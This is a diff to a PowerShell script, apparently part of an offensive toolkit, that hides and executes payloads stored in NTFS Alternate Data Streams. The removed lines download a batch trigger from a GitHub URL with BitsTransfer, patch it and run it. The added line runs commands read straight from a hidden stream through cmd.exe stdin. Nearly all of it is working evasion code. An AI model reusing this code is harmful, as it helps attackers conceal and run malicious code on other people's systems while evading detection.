@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
    
 .DESCRIPTION
    Alternate Data Streams (ADS) have been around since the introduction
@@ -228,27 +228,8 @@ If($ADS -ieq "Enum"){
         echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
         Get-Content -Path "$Env:TMP\fdllkf.log"
         Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
-
-        ## TODO: Replace next cmdline by bits-transfer download cmdline
-        # Copy-Item "$Env:USERPROFILE\coding\pswork\redpill\bypass\ADSBatExec.bat" "$StartDir\ADSBatExec.bat" -Force
-        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/ADSBatExec.bat -Destination $StartDir\ADSBatExec.bat -EA SilentlyContinue|Out-Null
-
-        If(-not(Test-Path -Path "$StartDir\ADSBatExec.bat" -EA SilentlyContinue)){
-            echo "[error] Not found: $StartDir\ADSBatExec.bat`n`n" > $Env:TMP\kbfdjk.log
-            Get-Content -Path "$Env:TMP\kbfdjk.log"
-            Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
-            exit ## Exit @AdsMasquerade        
-        }
-
-        ((Get-Content -Path $StartDir\ADSBatExec.bat -Raw) -Replace "tdrfdfd","$ParseDataName")|Set-Content -Path $StartDir\ADSBatExec.bat
-        ((Get-Content -Path $StartDir\ADSBatExec.bat -Raw) -Replace "fdxcscs","$InTextFile")|Set-Content -Path $StartDir\ADSBatExec.bat
-        cd $StartDir ## Change to $InTextFile working dir
-        cmd /c ADSBatExec.bat  ## Execute ads trigger script
-        cd $Working_Directory ## Return to @AdsMasquerade working dir
-
-        If(Test-Path -Path "$startDir\ADSBatExec.bat" -EA SilentlyContinue){
-            Remove-Item -Path "$startDir\ADSBatExec.bat" -Force
-        }
+        ## Nice trick to be abble to execute cmd stdin { < } on PS 
+        cmd.exe /c "cmd.exe - < ${InTextFile}:${ParseDataName}"
 
     }ElseIf($ParseDataName -Match '.ps1$'){
 
